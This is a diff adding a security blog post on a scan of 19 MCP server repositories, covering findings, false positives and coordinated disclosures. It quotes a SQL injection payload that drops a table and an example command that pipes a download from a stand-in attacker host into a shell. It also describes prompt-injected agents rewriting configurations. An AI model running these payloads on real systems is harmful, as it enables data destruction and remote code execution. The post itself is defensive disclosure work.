@@ -1,0 +1,511 @@
+---
+import Layout from '../../layouts/Layout.astro';
+---
+
+<Layout
+  title="We Scanned 19 MCP Servers. Here Is What We Found. — Commit"
+  description="We built a static analyzer, pointed it at the most popular MCP servers, and manually triaged every finding. The results challenge assumptions about both automated scanning and MCP security."
+  canonical="https://getcommit.dev/blog/mcp-security-landscape-2026/"
+  publishDate="2026-04-19"
+>
+
+  <!-- Nav -->
+  <nav>
+    <div class="container nav-inner">
+      <a href="/" class="nav-brand">Commit</a>
+      <ul class="nav-links">
+        <li><a href="/extension">Extension</a></li>
+        <li><a href="/blog">Writing</a></li>
+        <li><a href="/pricing">Pricing</a></li><li><a href="/docs">Docs</a></li><li><a href="https://github.com/piiiico/proof-of-commitment" target="_blank" rel="noopener">GitHub</a></li>
+        <li><a href="mailto:pico@amdal.dev">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <!-- Essay -->
+  <article class="essay">
+    <div class="container">
+      <div class="editorial">
+
+        <!-- Header -->
+        <header class="essay-header">
+          <div class="essay-meta animate-in delay-1">
+            <time datetime="2026-04-19">April 19, 2026</time>
+          </div>
+          <h1 class="essay-title animate-in delay-2">We Scanned 19 MCP Servers. Here's What We Found.</h1>
+          <p class="essay-subtitle animate-in delay-3">
+            We built a static analyzer, pointed it at the most popular MCP servers, and manually triaged every finding. The results challenge assumptions about both automated scanning and MCP security.
+          </p>
+          <p class="essay-byline animate-in delay-4">Pico</p>
+        </header>
+
+        <!-- Body -->
+        <div class="essay-body">
+
+          <p>
+            We built a static vulnerability scanner with 14 detection patterns across 7 categories (shell injection, path traversal, SSRF, SQL injection, configuration theater, missing authentication, and hardcoded secrets) and pointed it at 19 of the most popular MCP servers on GitHub.
+          </p>
+          <p>
+            Then we did the part that most security research skips: we manually triaged every single finding.
+          </p>
+          <p>
+            The scanner produced 862 findings across those 19 repos. After manual review, the majority were false positives. The real vulnerabilities we found were ones the scanner almost missed. And the most dangerous MCP security issues of 2026, the ones being actively exploited, live in a category that static analysis cannot reach at all.
+          </p>
+          <p>Here's the full data.</p>
+
+          <hr class="essay-divider" />
+
+          <h2>Methodology</h2>
+
+          <p>
+            Our scanner (<a href="https://github.com/piiiico/proof-of-commitment" target="_blank" rel="noopener">source</a>) walks every file in a repository, applies regex-based pattern matching against 14 vulnerability signatures, and produces a weighted score from 0 (clean) to 100 (maximum findings). Each finding is classified as CRITICAL, HIGH, MEDIUM, or LOW based on the pattern type and code context.
+          </p>
+          <p>
+            <strong>What it catches:</strong> <code>shell=True</code> with non-literal inputs, <code>multipleStatements: true</code> in MySQL configs, <code>fetch()</code> with non-literal URLs, <code>exec()</code>/<code>execSync()</code> with template literals, hardcoded credentials, path traversal via unsanitized joins, missing authentication on tool registrations.
+          </p>
+          <p>
+            <strong>What it doesn't catch:</strong> logic bugs, permission bypasses, supply chain issues, behavioral anomalies, or anything that requires understanding control flow beyond single-file pattern matching.
+          </p>
+          <p>
+            We know the limitations. That's the point of this article.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>The Results</h2>
+
+          <div style="overflow-x: auto; margin: 2rem 0;">
+            <table style="width: 100%; border-collapse: collapse; font-size: 0.875rem;">
+              <thead>
+                <tr style="border-bottom: 2px solid var(--border-light);">
+                  <th style="text-align: left; padding: 0.75rem 0.5rem 0.75rem 0; font-weight: 600;">Rank</th>
+                  <th style="text-align: left; padding: 0.75rem 0.5rem; font-weight: 600;">Repository</th>
+                  <th style="text-align: right; padding: 0.75rem 0.5rem; font-weight: 600;">Stars</th>
+                  <th style="text-align: right; padding: 0.75rem 0.5rem; font-weight: 600;">Score</th>
+                  <th style="text-align: left; padding: 0.75rem 0.5rem; font-weight: 600;">Key Findings</th>
+                  <th style="text-align: left; padding: 0.75rem 0 0.75rem 0.5rem; font-weight: 600;">After Triage</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">1</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>awslabs/mcp</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">8.8k</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">100</td>
+                  <td style="padding: 0.75rem 0.5rem;">64 HIGH, 27 MEDIUM</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Test fixtures + 1 SSRF worth inspecting</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">2</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>wonderwhy-er/DesktopCommanderMCP</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">5.9k</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">100</td>
+                  <td style="padding: 0.75rem 0.5rem;">17 HIGH, 126 MEDIUM</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Shell injection in build scripts, not runtime</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">3</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>googleapis/mcp-toolbox</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">14.6k</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">100</td>
+                  <td style="padding: 0.75rem 0.5rem;">20 HIGH</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">All in test files (Go)</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">4</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>microsoft/playwright-mcp</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">31k</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">100</td>
+                  <td style="padding: 0.75rem 0.5rem;">4 HIGH, 11 MEDIUM</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">All in test files</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">5</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>benborla/mcp-server-mysql</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">1.5k</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">100</td>
+                  <td style="padding: 0.75rem 0.5rem;"><strong>4 CRITICAL</strong>, 4 HIGH, 239 MEDIUM</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);"><strong>All CRITICALs false positive</strong></td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">6</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>modelcontextprotocol/python-sdk</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">N/A</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">100</td>
+                  <td style="padding: 0.75rem 0.5rem;"><strong>1 CRITICAL</strong>, 16 HIGH</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);"><strong>CRITICAL false positive</strong></td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">7</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>modelcontextprotocol/servers</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">N/A</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">100</td>
+                  <td style="padding: 0.75rem 0.5rem;">6 HIGH, 58 MEDIUM</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">String concat in descriptions, not SQL</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">8</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>idosal/git-mcp</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">7.9k</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">100</td>
+                  <td style="padding: 0.75rem 0.5rem;">5 HIGH, 19 MEDIUM</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">SSRF in fetch(), warrants inspection</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light); background: rgba(220, 38, 38, 0.04);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">9</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>executeautomation/mcp-database-server</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">N/A</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">73</td>
+                  <td style="padding: 0.75rem 0.5rem;">1 CRITICAL, 3 MEDIUM</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem;"><strong>Real: CVSS 8.8 SQL injection</strong></td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">10</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>g0t4/mcp-server-commands</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">N/A</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">72</td>
+                  <td style="padding: 0.75rem 0.5rem;">4 HIGH</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);"><code>shell:true</code> by design</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">11</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>firecrawl/firecrawl-mcp-server</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">6k</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">62</td>
+                  <td style="padding: 0.75rem 0.5rem;">1 HIGH, 13 LOW</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Test fixture credential</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">12</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>minhalvp/android-mcp-server</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">N/A</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">60</td>
+                  <td style="padding: 0.75rem 0.5rem;">4 HIGH</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Real: ADB delegation shell injection</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">13</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>snaggle-ai/openapi-mcp-server</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">N/A</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">32</td>
+                  <td style="padding: 0.75rem 0.5rem;">4 MEDIUM</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Low risk</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">14</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>BrowserMCP/mcp</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">6.4k</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">27</td>
+                  <td style="padding: 0.75rem 0.5rem;">1 HIGH, 4 LOW</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Low risk</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">15</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>zcaceres/fetch-mcp</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">N/A</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">14</td>
+                  <td style="padding: 0.75rem 0.5rem;">1 MEDIUM</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Low risk</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">16</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>designcomputer/mysql_mcp_server</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">N/A</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">8</td>
+                  <td style="padding: 0.75rem 0.5rem;">1 MEDIUM</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Low risk</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">17</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>kimtth/mcp-aoai-web-browsing</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">N/A</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">0</td>
+                  <td style="padding: 0.75rem 0.5rem;">None</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Clean</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">18</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>mark3labs/mcp-filesystem-server</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">N/A</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">0</td>
+                  <td style="padding: 0.75rem 0.5rem;">None</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Clean</td>
+                </tr>
+                <tr>
+                  <td style="padding: 0.75rem 0.5rem 0.75rem 0; color: var(--ink-subtle);">19</td>
+                  <td style="padding: 0.75rem 0.5rem;"><code>github/github-mcp-server</code></td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">29k</td>
+                  <td style="text-align: right; padding: 0.75rem 0.5rem;">0</td>
+                  <td style="padding: 0.75rem 0.5rem;">None</td>
+                  <td style="padding: 0.75rem 0 0.75rem 0.5rem; color: var(--ink-subtle);">Clean</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <p>
+            <strong>The headline number: 8 repos scored 100/100 on the scanner. After manual triage, zero of those 8 had a CRITICAL vulnerability in their production code.</strong>
+          </p>
+          <p>
+            The repo that <em>did</em> have a confirmed CRITICAL vulnerability (executeautomation/mcp-database-server) scored 73.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>The Real Findings</h2>
+
+          <h3>executeautomation/mcp-database-server: SQL Injection (CVSS 8.8)</h3>
+
+          <p>
+            This is the one we disclosed. The MySQL adapter hardcodes <code>multipleStatements: true</code>, which means semicolon-stacked queries are allowed. The only defense is a <code>startsWith("SELECT")</code> prefix check, trivially bypassed.
+          </p>
+
+          <pre><code>SELECT 1; DROP TABLE users; --</code></pre>
+
+          <p>
+            This passes the prefix check and executes both statements.
+          </p>
+          <p>
+            We submitted <a href="https://github.com/executeautomation/mcp-database-server/security/advisories/GHSA-2gc7-7mj4-79wg" target="_blank" rel="noopener">GHSA-2gc7-7mj4-79wg</a> on April 6, 2026. The maintainer never responded. After 7 days of silence, we executed full public disclosure via oss-security, npm security, and GitHub's security team. The advisory remains in triage. No CVE has been assigned.
+          </p>
+          <p>
+            The same repo had a previously published vulnerability (CVE-2025-59333, CVSS 8.1) in its PostgreSQL adapter, with the same root cause: string prefix checks as security controls. That CVE was reported by Liran Tal in September 2025. The MySQL adapter vulnerability is the same pattern, unfixed.
+          </p>
+
+          <h3>mcp-atlassian: SSRF, JQL Injection, XSS</h3>
+
+          <p>
+            We identified four vulnerabilities in sooperset/mcp-atlassian (4,400+ stars):
+          </p>
+          <ul>
+            <li><strong>High:</strong> SSRF via <code>icon_url</code> parameter: unvalidated URL fetched server-side</li>
+            <li><strong>High:</strong> SSRF via attachment URL: unvalidated URL fetched server-side</li>
+            <li><strong>Medium:</strong> JQL injection: unparameterized Jira Query Language construction</li>
+            <li><strong>Medium:</strong> Stored XSS: unsanitized content rendered in Atlassian comments</li>
+          </ul>
+          <p>
+            Coordinated disclosure was sent April 10. At time of writing, the maintainer has not responded despite their own SECURITY.md specifying a 72-hour acknowledgment window.
+          </p>
+          <p>
+            This is the same mcp-atlassian that was independently targeted by MCPwnfluence (CVE-2026-27825, CVE-2026-27826). That was a separate, more severe vulnerability chain (SSRF + arbitrary file write → unauthenticated RCE) discovered by Pluto Security. Different bugs, same server, same underlying problem: a single-maintainer package connecting AI agents to enterprise infrastructure.
+          </p>
+
+          <h3>android-mcp-server: Filesystem Write via ADB</h3>
+
+          <p>
+            Our scanner flagged shell injection patterns in minhalvp/android-mcp-server. Manual review confirmed: the <code>pull_file</code> tool allows arbitrary filesystem write (HIGH), and <code>type_text</code> has a newline injection that enables command execution (MEDIUM). Disclosed April 18, 90-day deadline July 17.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>The False Positives That Matter</h2>
+
+          <h3>benborla/mcp-server-mysql: Score 100, All CRITICALs False</h3>
+
+          <p>
+            The scanner flagged 4 CRITICAL findings in benborla/mcp-server-mysql (1,552 stars, 197 forks). All were false positives.
+          </p>
+          <p>
+            <strong><code>multipleStatements: true</code></strong> appeared in test setup scripts and inside the bundled mysql2 driver in <code>.smithery/index.cjs</code>, not in production config. The production connection never sets this flag; mysql2 defaults to <code>false</code>.
+          </p>
+          <p>
+            <strong>"SQL injection via string concatenation"</strong> was flagged in <code>.smithery/index.cjs</code> at a line that turned out to be node-sql-parser's PEG.js-generated internals doing keyword matching. The parser <em>recognizes</em> SQL; it doesn't <em>construct</em> it.
+          </p>
+          <p>
+            After deep review, the real concern was MEDIUM-severity: a parser-based permission system that can be bypassed if the operator enables <code>MYSQL_DISABLE_READ_ONLY_TRANSACTIONS=true</code>. Not the catastrophe the scanner suggested.
+          </p>
+          <p>
+            <strong>Lesson:</strong> A bundled dependency (mysql2 inside .smithery/) containing <code>multipleStatements: true</code> as a <em>configuration option definition</em> is not the same as application code enabling it. Our scanner didn't know the difference. It should.
+          </p>
+
+          <div style="overflow-x: auto; margin: 2rem 0;">
+            <table style="width: 100%; border-collapse: collapse; font-size: 0.9rem;">
+              <thead>
+                <tr style="border-bottom: 2px solid var(--border-light);">
+                  <th style="text-align: left; padding: 0.75rem 1rem 0.75rem 0; font-weight: 600;">Finding</th>
+                  <th style="text-align: left; padding: 0.75rem 1rem; font-weight: 600;">Scanner Says</th>
+                  <th style="text-align: left; padding: 0.75rem 0 0.75rem 1rem; font-weight: 600;">Reality</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 1rem 0.75rem 0;"><code>multipleStatements: true</code></td>
+                  <td style="padding: 0.75rem 1rem;">CRITICAL</td>
+                  <td style="padding: 0.75rem 0 0.75rem 1rem; color: var(--ink-subtle);">In bundled mysql2 driver, not production config</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border-light);">
+                  <td style="padding: 0.75rem 1rem 0.75rem 0;">SQL string concatenation</td>
+                  <td style="padding: 0.75rem 1rem;">CRITICAL</td>
+                  <td style="padding: 0.75rem 0 0.75rem 1rem; color: var(--ink-subtle);">PEG.js-generated parser internals</td>
+                </tr>
+                <tr>
+                  <td style="padding: 0.75rem 1rem 0.75rem 0;">Permission bypass</td>
+                  <td style="padding: 0.75rem 1rem;">Not flagged</td>
+                  <td style="padding: 0.75rem 0 0.75rem 1rem; color: var(--ink-subtle);">Real MEDIUM risk (requires operator misconfiguration)</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h3>modelcontextprotocol/python-sdk: Score 100, CRITICAL False</h3>
+
+          <p>
+            The official MCP Python SDK got flagged CRITICAL for <code>shell=True</code> in two locations:
+          </p>
+          <ol>
+            <li><strong>Line 48:</strong> <code>subprocess.run([cmd, "--version"], check=True, shell=True)</code> where <code>cmd</code> only takes values from the hardcoded list <code>["npx.cmd", "npx.exe", "npx"]</code>. No user input reaches this call.</li>
+            <li><strong>Line 279:</strong> <code>shell = sys.platform == "win32"</code>: conditional Windows-only usage in a local CLI tool (<code>mcp dev</code>). The person running the command is the person providing the input. Attacker equals victim.</li>
+          </ol>
+          <p>
+            Neither is exploitable. Neither affects downstream MCP servers, which import <code>mcp.server</code>, not <code>mcp.cli</code>. The scanner correctly identified <code>shell=True</code> as a dangerous pattern, but context reduces both findings to code quality issues, not vulnerabilities.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>The Pattern: High Scanner Scores ≠ Real Vulnerabilities</h2>
+
+          <p>The data is clear:</p>
+          <ul>
+            <li><strong>8 repos scored 100/100.</strong> Zero had confirmed CRITICAL vulnerabilities in production code.</li>
+            <li><strong>The confirmed CVSS 8.8 vulnerability</strong> was in a repo that scored 73.</li>
+            <li><strong>github/github-mcp-server</strong> (29,000 stars, Go) scored 0. Clean.</li>
+            <li><strong>mark3labs/mcp-filesystem-server</strong> (Go) scored 0. Clean.</li>
+          </ul>
+          <p>
+            The two clean repos are both written in Go. Go's strong typing and explicit error handling produce fewer pattern-match surfaces for regex-based scanners. This doesn't mean Go MCP servers are inherently safer; it means our scanner is calibrated for JavaScript/TypeScript/Python idioms.
+          </p>
+          <p>
+            The deeper insight: <strong>test code inflates scores dramatically.</strong> Hardcoded credentials in test fixtures, SSRF patterns in test URLs, shell injection in build scripts, all legitimate in their context but all flagged as production vulnerabilities. A scanner that can't distinguish <code>tests/integration/mysql.test.ts</code> from <code>src/db/adapter.ts</code> will systematically overcount.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>What Static Analysis Can't See</h2>
+
+          <p>
+            While we were triaging false positives, the MCP ecosystem experienced its worst month for actual exploitation:
+          </p>
+          <p>
+            <strong>MCPwn (CVE-2026-33032, CVSS 9.8):</strong> Two HTTP requests, no authentication, full nginx server takeover. 2,600+ instances exposed. Actively exploited before patches shipped. Discovered by Pluto Security.
+          </p>
+          <p>
+            <strong>MCPwnfluence (CVE-2026-27825, CVE-2026-27826):</strong> The most popular Atlassian MCP server. SSRF chained with arbitrary file write for unauthenticated RCE. Two requests, root on your machine.
+          </p>
+          <p>
+            <strong>Ox Security STDIO Injection Class (10+ CVEs):</strong> A systemic vulnerability class affecting 150 million downloads and approximately 200,000 instances. The attack surface is MCP's stdio transport, with four vectors: transport type manipulation, prompt injection to malicious configs, direct parameter injection, and allowlist bypasses (e.g., <code>npx -c "curl attacker.com | sh"</code>). CVEs confirmed in Windsurf, Agent Zero, Langchain-Chatchat, Flowise, GPT Researcher, and others.
+          </p>
+          <p>
+            None of these would have been caught by our scanner. MCPwn is a logic vulnerability in a Go binary. MCPwnfluence is a chained attack requiring understanding of multi-step control flow. The STDIO injection class exploits a fundamental architectural assumption about who controls configuration files.
+          </p>
+          <p>
+            Static analysis finds patterns. These attacks exploit behavior.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>The Trust Gap</h2>
+
+          <p>
+            Here's what our research tells us when you put the scanner results next to the real-world exploits:
+          </p>
+          <p>
+            <strong>Static scanning is necessary but not sufficient.</strong> It catches configuration mistakes (<code>multipleStatements: true</code> in production), obvious injection surfaces, and hardcoded credentials. It does not catch logic bugs, chained attacks, or the new class of agent-mediated vulnerabilities where the "attacker" is a prompt-injected AI modifying configuration files.
+          </p>
+          <p>
+            <strong>The false positive rate for MCP servers is structurally high.</strong> MCP servers are <em>designed</em> to execute commands, query databases, and fetch URLs. The patterns that indicate vulnerabilities in web applications are often the intended functionality of MCP tools. A SQL query tool that accepts SQL input is not "SQL injection." A command executor that runs shell commands is not "shell injection." Scanners need MCP-specific context to be useful.
+          </p>
+          <p>
+            <strong>The real risk is behavioral, not structural.</strong> Every exploited MCP server in 2026 was compromised through behavioral patterns: what the server <em>did</em> at runtime, not what its code <em>looked like</em> statically. The STDIO injection class is the clearest example. Sanitization was correct at code review time, but an AI agent modified the config at runtime, and no sanitization code ran.
+          </p>
+          <p>
+            This is the gap that behavioral monitoring addresses. Not "does this code contain dangerous patterns?" but "is this agent doing something behaviorally inconsistent with its authorization?"
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>What We're Doing About It</h2>
+
+          <p>
+            We've open-sourced the scanner and the triage methodology. We've updated our detection patterns based on what we learned:
+          </p>
+          <ol>
+            <li><strong>Exclude bundled dependencies:</strong> <code>.smithery/</code>, <code>dist/</code>, <code>node_modules/</code> inflate scores with library internals</li>
+            <li><strong>Distinguish test from production code:</strong> <code>multipleStatements: true</code> in test files is expected</li>
+            <li><strong>Context-aware injection detection:</strong> string concatenation in parser generators is not SQL injection</li>
+            <li><strong>MCP tool semantics:</strong> a SQL query tool that takes SQL input needs different evaluation criteria</li>
+          </ol>
+          <p>
+            But the harder lesson from this research is that better static analysis is not the answer to MCP security. Behavioral monitoring is what catches it: watching what agents actually do at runtime, detecting anomalies that no amount of code scanning can predict.
+          </p>
+          <p>
+            Run our scanner on your MCP dependencies. It will catch the easy stuff. For everything else, you need eyes on behavior.
+          </p>
+
+          <pre><code>npx proof-of-commitment mcp-remote @modelcontextprotocol/server-github
+
+# Or scan the full supply chain
+curl -X POST https://poc-backend.amdal-dev.workers.dev/api/graph/npm \
+  -H "Content-Type: application/json" \
+  -d '&#123;"package": "@modelcontextprotocol/sdk", "depth": 2&#125;'</code></pre>
+
+          <p>Web UI: <a href="https://getcommit.dev/audit">getcommit.dev/audit</a></p>
+
+          <hr class="essay-divider" />
+
+          <p class="essay-coda">
+            <em>Data collected April 19, 2026. Scanner source and methodology at <a href="https://github.com/piiiico/proof-of-commitment" target="_blank" rel="noopener">github.com/piiiico/proof-of-commitment</a>. Disclosed vulnerabilities follow coordinated disclosure timelines: executeautomation (<a href="https://github.com/executeautomation/mcp-database-server/security/advisories/GHSA-2gc7-7mj4-79wg" target="_blank" rel="noopener">GHSA-2gc7-7mj4-79wg</a>, publicly disclosed April 13), mcp-atlassian (coordinated, pending), android-mcp-server (coordinated, 90-day window). We acknowledge limitations in our scanner and continue to improve detection patterns based on triage results.</em>
+          </p>
+
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <!-- Newsletter -->
+  <section class="newsletter-section">
+    <div class="container">
+      <div class="editorial reveal">
+        <h2 style="margin-bottom: 0.75rem;">Stay in the loop</h2>
+        <p style="margin-bottom: 2rem; font-size: 1rem;">
+          Early access, research updates, and the occasional strong opinion.
+        </p>
+
+        <form
+          action="https://buttondown.email/api/emails/embed-subscribe/commitgraph"
+          method="post"
+          target="popupwindow"
+          class="newsletter-form"
+        >
+          <input
+            type="email"
+            name="email"
+            placeholder="you@example.com"
+            required
+            class="newsletter-input"
+          />
+          <button type="submit" class="btn-primary" style="white-space: nowrap;">
+            Subscribe
+          </button>
+        </form>
+
+        <p class="newsletter-note">No spam. Unsubscribe anytime.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer>
+    <div class="container footer-inner">
+      <span class="footer-brand">Commit</span>
+      <ul class="footer-links">
+        <li><a href="/">Home</a></li>
+        <li><a href="/extension">Extension</a></li>
+        <li><a href="/blog">Writing</a></li>
+        <li><a href="/pricing">Pricing</a></li><li><a href="/docs">Docs</a></li><li><a href="https://github.com/piiiico/proof-of-commitment" target="_blank" rel="noopener">GitHub</a></li>
+        <li><a href="mailto:pico@amdal.dev">Contact</a></li>
+      </ul>
+      <span class="footer-locale">Stavanger, Norway</span>
+    </div>
+  </footer>
+
+</Layout>
